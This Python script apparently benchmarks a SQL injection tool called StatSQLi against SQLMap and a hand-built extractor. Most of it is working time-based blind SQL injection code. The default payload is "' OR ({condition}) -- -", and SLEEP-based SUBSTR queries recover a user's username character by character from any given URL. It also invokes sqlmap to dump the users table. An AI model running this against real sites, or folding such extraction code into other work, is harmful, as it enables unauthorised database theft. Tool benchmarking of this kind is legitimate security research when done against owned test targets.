"""
Benchmark script to compare StatSQLi with SQLMap and Burp Suite.
Runs extraction tests and measures performance metrics.
"""

import time
import subprocess
import json
import statistics
import requests
import re
import shutil
from typing import Dict, List
from pathlib import Path
import sys

# Add parent directory to path
sys.path.insert(0, str(Path(__file__).parent.parent))

from statsqli.main import StatSQLi


class BenchmarkRunner:
    """Runs benchmarks comparing different SQL injection tools."""
    
    def __init__(self, target_url: str, test_payload: str, iterations: int = 5, user_id: int = 1):
        """
        Initialize benchmark runner.
        
        Args:
            target_url: Vulnerable URL to test
            test_payload: Payload template to use
            iterations: Number of iterations per tool
            user_id: User ID to extract (default: 1 for admin)
        """
        self.target_url = target_url
        self.test_payload = test_payload
        self.iterations = iterations
        self.user_id = user_id
        self.results: Dict[str, List[float]] = {
            'statsqli': [],
            'sqlmap': [],
            'manual': []
        }
    
    def benchmark_statsqli(self) -> List[float]:
        """Benchmark StatSQLi extraction."""
        print("[*] Benchmarking StatSQLi...")
        times = []
        
        for i in range(self.iterations):
            print(f"  [*] Iteration {i+1}/{self.iterations}")
            start = time.time()
            
            try:
                tool = StatSQLi(
                    self.target_url,
                    self.test_payload,
                    delay=2.0,
                    parallel=True
                )
                # Extract specific user by ID (user_id - 1 because LIMIT is 0-indexed)
                result = tool.extract_string_custom(
                    table="users",
                    column="username",
                    where_clause=f"id={self.user_id} LIMIT 0,1",
                    max_length=20
                )
                
                elapsed = time.time() - start
                times.append(elapsed)
                print(f"  [+] Completed in {elapsed:.2f}s - Extracted: {result}")
                
            except Exception as e:
                print(f"  [!] Error: {e}")
                times.append(float('inf'))
        
        return times
    
    def benchmark_sqlmap(self) -> List[float]:
        """Benchmark SQLMap extraction."""
        print("[*] Benchmarking SQLMap...")
        times = []
        
        # Try to find SQLMap in multiple ways
        sqlmap_path = None
        import shutil
        
        # Try direct sqlmap command
        if shutil.which("sqlmap"):
            sqlmap_path = "sqlmap"
        # Try python3 -m sqlmap
        elif shutil.which("python3"):
            try:
                result = subprocess.run(
                    ["python3", "-m", "sqlmap", "--version"],
                    capture_output=True,
                    timeout=5
                )
                if result.returncode == 0:
                    sqlmap_path = "python3"
                    sqlmap_module = "-m sqlmap"
            except:
                pass
        
        if sqlmap_path is None:
            print("  [!] SQLMap not found. Install it with: pip3 install sqlmap")
            return [float('inf')] * self.iterations
        
        for i in range(self.iterations):
            print(f"  [*] Iteration {i+1}/{self.iterations}")
            start = time.time()
            
            try:
                # SQLMap command for time-based extraction
                # Note: SQLMap will extract all users, but we time it for comparison
                if sqlmap_path == "python3":
                    cmd = [
                        "python3", "-m", "sqlmap",
                        "-u", self.target_url,
                        "--technique=T",
                        "--batch",
                        "--dump", "--dump-format=JSON",
                        "-T", "users",
                        "-C", "username",
                        "--where", f"id={self.user_id}",
                        "--limit=1"
                    ]
                else:
                    cmd = [
                        sqlmap_path,
                        "-u", self.target_url,
                        "--technique=T",
                        "--batch",
                        "--dump", "--dump-format=JSON",
                        "-T", "users",
                        "-C", "username",
                        "--where", f"id={self.user_id}",
                        "--limit=1"
                    ]
                
                result = subprocess.run(
                    cmd,
                    capture_output=True,
                    timeout=300  # 5 minute timeout
                )
                
                elapsed = time.time() - start
                times.append(elapsed)
                print(f"  [+] Completed in {elapsed:.2f}s")
                
            except subprocess.TimeoutExpired:
                print(f"  [!] Timeout after 300s")
                times.append(float('inf'))
            except FileNotFoundError:
                print(f"  [!] SQLMap not found. Install it separately.")
                times.append(float('inf'))
            except Exception as e:
                print(f"  [!] Error: {e}")
                times.append(float('inf'))
        
        return times
    
    def benchmark_manual(self) -> List[float]:
        """
        Benchmark manual/traditional extraction (actual linear search).
        This represents traditional method: linear character search with threshold-based detection.
        """
        print("[*] Benchmarking manual/traditional extraction...")
        times = []
        
        for i in range(self.iterations):
            print(f"  [*] Iteration {i+1}/{self.iterations}")
            start = time.time()
            
            try:
                # Traditional method: linear search with simple threshold
                session = requests.Session()
                
                # Extract base URL
                if '?' in self.target_url:
                    url = self.target_url.split('?')[0]
                else:
                    url = self.target_url
                
                # Establish baseline (simple average, no statistics)
                baseline_times = []
                baseline_payload = self.test_payload.format(condition="1=0")
                for _ in range(5):
                    req_start = time.time()
                    try:
                        session.get(url, params={'id': baseline_payload}, timeout=30)
                    except requests.RequestException:
                        pass
                    baseline_times.append(time.time() - req_start)
                baseline_avg = sum(baseline_times) / len(baseline_times)
                threshold = baseline_avg + 1.5  # Simple threshold (1.5s above baseline)
                
                # Extract string using linear search (traditional method)
                result = ""
                max_length = 20
                
                for pos in range(1, max_length + 1):
                    char_found = False
                    
                    # Linear search through printable ASCII (32-126)
                    for ascii_val in range(32, 127):
                        # Test if character equals this ASCII value
                        # Use same query as StatSQLi benchmark (extract specific user by ID)
                        char_query = f"UNICODE(SUBSTR((SELECT username FROM users WHERE id={self.user_id} LIMIT 0,1), {pos}, 1))"
                        condition = f"{char_query} = {ascii_val}"
                        
                        # Build payload
                        if "SLEEP" in self.test_payload.upper():
                            payload_template = re.sub(
                                r'SLEEP\([0-9.]+\)',
                                'SLEEP(2)',
                                self.test_payload,
                                flags=re.IGNORECASE
                            )
                            payload = payload_template.format(condition=condition)
                        else:
                            payload = self.test_payload.format(
                                condition=f"({condition}) AND SLEEP(2)"
                            )
                        
                        # Make request and measure time
                        req_start = time.time()
                        try:
                            session.get(url, params={'id': payload}, timeout=30)
                        except requests.RequestException:
                            pass
                        elapsed = time.time() - req_start
                        
                        # Simple threshold check (traditional method)
                        if elapsed > threshold:
                            result += chr(ascii_val)
                            char_found = True
                            break
                    
                    if not char_found:
                        break  # End of string
                
                elapsed = time.time() - start
                times.append(elapsed)
                print(f"  [+] Completed in {elapsed:.2f}s - Extracted: {result}")
                
            except Exception as e:
                print(f"  [!] Error: {e}")
                times.append(float('inf'))
        
        return times
    
    def run_all_benchmarks(self) -> Dict[str, Dict[str, float]]:
        """Run all benchmark tests."""
        print("=" * 60)
        print("Running comprehensive benchmarks...")
        print("=" * 60)
        
        # Run benchmarks
        self.results['statsqli'] = self.benchmark_statsqli()
        self.results['sqlmap'] = self.benchmark_sqlmap()
        self.results['manual'] = self.benchmark_manual()
        
        # Calculate statistics
        summary = {}
        for tool, times in self.results.items():
            valid_times = [t for t in times if t != float('inf')]
            if valid_times:
                summary[tool] = {
                    'mean': statistics.mean(valid_times),
                    'median': statistics.median(valid_times),
                    'std': statistics.stdev(valid_times) if len(valid_times) > 1 else 0,
                    'min': min(valid_times),
                    'max': max(valid_times),
                    'success_rate': len(valid_times) / len(times)
                }
            else:
                summary[tool] = {
                    'mean': float('inf'),
                    'median': float('inf'),
                    'std': 0,
                    'min': float('inf'),
                    'max': float('inf'),
                    'success_rate': 0
                }
        
        return summary
    
    def print_results(self, summary: Dict[str, Dict[str, float]]):
        """Print formatted benchmark results."""
        print("\n" + "=" * 60)
        print("BENCHMARK RESULTS")
        print("=" * 60)
        
        for tool, stats in summary.items():
            print(f"\n{tool.upper()}:")
            if stats['mean'] != float('inf'):
                print(f"  Mean time:    {stats['mean']:.2f}s")
                print(f"  Median time:  {stats['median']:.2f}s")
                print(f"  Std dev:      {stats['std']:.2f}s")
                print(f"  Min time:     {stats['min']:.2f}s")
                print(f"  Max time:     {stats['max']:.2f}s")
                print(f"  Success rate: {stats['success_rate']*100:.1f}%")
            else:
                print(f"  Failed or not available")
        
        # Calculate speedup
        if summary['statsqli']['mean'] != float('inf'):
            if summary['sqlmap']['mean'] != float('inf'):
                speedup_sqlmap = summary['sqlmap']['mean'] / summary['statsqli']['mean']
                print(f"\n[*] StatSQLi is {speedup_sqlmap:.2f}x faster than SQLMap")
            
            if summary['manual']['mean'] != float('inf'):
                speedup_manual = summary['manual']['mean'] / summary['statsqli']['mean']
                print(f"[*] StatSQLi is {speedup_manual:.2f}x faster than manual/baseline")
    
    def save_results(self, summary: Dict[str, Dict[str, float]], filename: str = "benchmark_results.json"):
        """Save results to JSON file."""
        output = {
            'target_url': self.target_url,
            'iterations': self.iterations,
            'user_id': self.user_id,
            'summary': summary,
            'raw_times': self.results
        }
        
        with open(filename, 'w') as f:
            json.dump(output, f, indent=2)
        
        print(f"\n[+] Results saved to {filename}")


def main():
    """Main benchmark execution."""
    import argparse
    
    parser = argparse.ArgumentParser(description='Benchmark StatSQLi against other tools')
    parser.add_argument('url', help='Target vulnerable URL')
    parser.add_argument('--payload', '-p', help='Payload template', 
                       default="' OR ({condition}) -- -")
    parser.add_argument('--iterations', '-i', type=int, default=5,
                       help='Number of iterations per tool')
    parser.add_argument('--user-id', '-u', type=int, default=1,
                       help='User ID to extract (default: 1 for admin)')
    parser.add_argument('--output', '-o', default='benchmark_results.json',
                       help='Output JSON file')
    
    args = parser.parse_args()
    
    print(f"[*] Benchmarking extraction for user ID: {args.user_id}")
    runner = BenchmarkRunner(args.url, args.payload, args.iterations, args.user_id)
    summary = runner.run_all_benchmarks()
    runner.print_results(summary)
    runner.save_results(summary, args.output)


if __name__ == '__main__':
    main()

